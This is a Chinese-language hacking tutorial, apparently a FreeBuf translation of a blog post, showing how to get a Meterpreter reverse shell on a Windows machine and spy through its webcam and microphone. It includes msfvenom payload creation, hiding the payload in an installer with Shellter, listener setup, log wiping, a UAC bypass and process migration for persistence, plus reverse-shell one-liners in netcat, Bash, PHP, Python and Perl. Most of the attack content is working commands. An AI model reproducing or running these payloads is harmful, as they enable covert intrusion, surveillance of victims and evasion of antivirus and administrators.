**![computer-programmers-type-code-laptop_29110-6.jpg](https://image.3001.net/images/20190724/1563926783_5d37a0ff5f91d.jpg!small)**

**如果你已经用胶条封住了你的网络摄像头，你可能是因为听说过黑客或NSA可以远程监视你。那么问题来了，这些你素未谋面人又是如何远程连接到你的机器并监视你的呢？**

这可能是因为你将你的CCTV，IP摄像头公开暴露在了互联网上，而攻击者又在Shodan等网站上发现了它们。加之你又没有更改它们的默认密码和bam，导致攻击者顺利控制了你的摄像头，并对你的一举一动进行监视。

以上是物联网摄像头最常见的安全问题。但如果是内置的网络摄像头，那么更可能的解释是攻击者通过Meterpreter
payload入侵并控制了它。使用Meterpreter攻击者可以获取到一个反向shell，这也是本文将要讨论的内容。有关Meterpreter的更多信息，请参阅：<https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/>

这里，你可能有个疑问。为什么攻击者不直接访问你的机器，而是通过一个反向shell呢？其实原因很简单，因为直接访问的方式很可能会被阻止。相比起出站流量，入站流量更容易受到限制。另一方面，如果我们主动进行连接，那么目标机器更有可能放行该流量。这是因为目标机器想要与我们的机器建立连接。

![1.png](https://image.3001.net/images/20190724/1563926811_5d37a11b456aa.png!small)

msfvenom是一个框架，我们将用它来获取一个反向shell。它已被预装在了Parrot和Kali上。首先，让我们运行以下命令来创建Meterpreter
reverse TCP shell payload。

    
    
    msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows -f exe LHOST=192.168.X.X LPORT=4444 -o /home/parrot/name.exe

![2.png](https://image.3001.net/images/20190724/1563926824_5d37a1282c2b5.png!small)

创建完成后，现在让我们来上传它..........blocked。这是因为MeterPreter
payload名声在外，早已被各个安全软件所标记，因此大多数的安全软件都能够发现阻止/隔离它。

![3.png](https://image.3001.net/images/20190724/1563926834_5d37a132e202f.png!small)

我们可以尝试使用一个名为Shellter的工具，来更改其哈希并将反向shell嵌入到另一个文件当中。之所以选择将shell嵌入到一个安装文件中，是因为大多数安装文件需要以管理员身份运行。正如你在之后将看到的那样，以管理员身份运行漏洞利用程序，可以为我们省去很多的麻烦。

你可以通过shelter来直接启动它。同样，它已被预装在了Parrot和Kali上。

![4.png](https://image.3001.net/images/20190724/1563926848_5d37a14022bd4.png!small)

让我们使用Auto [A]并定位我为本例创建的可执行文件。

![5.png](https://image.3001.net/images/20190724/1563926859_5d37a14bd21b6.png!small)

接下来，我们选择反向TCP
shell并输入我们机器的IP和端口（攻击者）。完成后，它会将shell嵌入到你选择的exe文件中，以便你将其上传到目标机器。现在你需要通过一种方法将它放到目标机器上，但对于本例我将复制并粘贴。

虽然，我们隐藏了Meterpreter
shell，但AV还是成功地检测到了它。为了便于我们的演示，我们现在暂时先将AV关闭。当然，在现实场景中攻击者不可能像我这么随意，更多的是通过技术手段击溃AV，或是创建一个目标无法检测的payload。

然而，尽管屏蔽了Meterpreter外壳，AV仍设法检测到它。 我现在就打算把它关掉，因为我可以。
在现实世界中，攻击者会将AV瘫痪或使其盲目，以便他们可以降低有效载荷。

现在，让我们运行它。

在开始之前，让我们在攻击机机上加载msfconsole（Metasploit）并运行以下命令：

    
    
    msfconsole
    use multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST 192.168.X.X
    set LPORT 4444
    run

![6.png](https://image.3001.net/images/20190724/1563926876_5d37a15c9253f.png!small)

你的会话将侦听反向shell脚本中指定的端口和IP。现在，我们以用户身份运行exploit：

![7.png](https://image.3001.net/images/20190724/1563926887_5d37a1679c5a2.png!small)

正如你在右侧所看到的，我们有几次会话建立失败的情况。这就是我之前提到的为什么需要用户以管理员身份运行的原因。那样就可以顺利运行和注入所有的脚本和DLL。如果用户以管理员身份运行，你将不会看到任何失败的情况。如下所示：

![8.png](https://image.3001.net/images/20190724/1563926898_5d37a1726f21b.png!small)

成功获取反向shell后，现在我们就可以针对目标机器执行我们想要的操作了。如果你的目标是摄像头，那么你可以执行以下操作：

    
    
    Show Webcams: webcam_list
    Webcam Snap Help: webcam_snap -h
    Take a Picture and don’t load the image after: webcam_snap -i 1 -v false
    Record audio: record_mic
    Record Webcam: run webcam -p /var/www/
    Stop recording: run webcam -s

![9.jpg](https://image.3001.net/images/20190724/1563926911_5d37a17f37545.jpg!small)

不仅仅是网络摄像头（Webcams）。你还可以执行更多其他的命令。例如：清除所有日志（应用程序，系统和安全日志）：clearev

这只是一个例子，黑客也不太可能会运行它。因为这么做反而会打草惊蛇提醒了管理员。如果一台机器你发现所有日志都被清除了，那么你可以初步断定有人已经使用过它了。相反，攻击者更有可能的是删除选择的事件来掩盖他们的痕迹。

所有这些都需要管理员权限，而你的用户可能无法使用提升的权限来运行它。那么，你可以使用像bypassuac_comhijacker这样的命令。首先，你仍需要得到一个普通用户级别的反向shell。

获得shell后，输入background并按Enter键。这会将当前会话移至后台。然后你就可以针对当前会话使用bypassuac_comhijack漏洞利用程序了，如下：

![10.png](https://image.3001.net/images/20190724/1563926929_5d37a19169c9e.png!small)

然后，你可以回到原始会话并运行以下命令：

![11.png](https://image.3001.net/images/20190724/1563926940_5d37a19c695a2.png!small)

成功运行后，你将获取到一个admin
shell。为了与目标机器建立长期稳定的后门连接，我们需要将我们的反向shell隐藏在一个更为隐蔽和稳定的进程中（而不是Putty
exe或installer文件中）因为这些应用一旦被关闭，我们的连接就将丢失。这就是为什么我们需要尽快迁移我们的反向shell，到那些可以持续运行进程中的原因。

![12.png](https://image.3001.net/images/20190724/1563926955_5d37a1abd1d63.png!small)

首先，让我们查看正在运行的进程有哪些。

![13.png](https://image.3001.net/images/20190724/1563926966_5d37a1b6b03b8.png!small)

找到相对稳定的进程后，运行migrate [PID]

![14.png](https://image.3001.net/images/20190724/1563926977_5d37a1c15ad89.png!small)

然后，它会将你的Meterpreter会话迁移到另一个进程中。这样即使他们关闭了被利用的应用程序，你的会话也将被保留。

正如你所看到的，Meterpreter非常的强大。但这并不是你获得反向shell的唯一方法。你还可以使用Netcat。相比起Meterpreter，某些AV供应商并不将其视为威胁。你可以[点击此处](https://www.virustotal.com/gui/file/be4211fe5c1a19ff393a2bcfa21dad8d0a687663263a63789552bda446d9421b/detection)，查看virustotal中的检测结果。

![15.png](https://image.3001.net/images/20190724/1563927006_5d37a1de27908.png!small)

你可以在Parrot或Kali上的usr/share/windows-binaries/nc.exe下找到Netcat。将nc.exe上传到目标机器后，我们可以运行nc.exe [Attacker IP] [Port] -e
cmd.exe。

![16.png](https://image.3001.net/images/20190724/1563927021_5d37a1ed7c588.png!small)

在攻击者机器上我们需要侦听连接，这可以通过运行nc -lvp [Chosen port]命令来完成。

你将获取到一个普通用户权限的简单反向shell，这对你来说是一个好的开始。然后，你可以通过它来进一步的利用系统获得管理员权限。以下是一些运行反向shell的示例：

 **PHP**

    
    
    php -r ‘$sock=fsockopen(“192.168.0.10”,1234);exec(“/bin/sh -i <&3 >&3 2>&3”);’

 **Bash**

    
    
    bash -i >& /dev/tcp/192.168.0.1/8080 0>&1

 **Netcat Linux**

    
    
    nc 192.168.0.10 1234 -e /bin/sh

 **Python**

    
    
    python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.0.10”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’

 **Perl**

    
    
    perl -e ‘use Socket;$i=“192.168.0.10”;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,

 ***参考来源：[ctrlaltdel](https://ctrlaltdel.blog/2019/07/02/reverse-shells-and-controlling-webcams/)，FB小编secist编译，转载请注明来自FreeBuf.COM**  

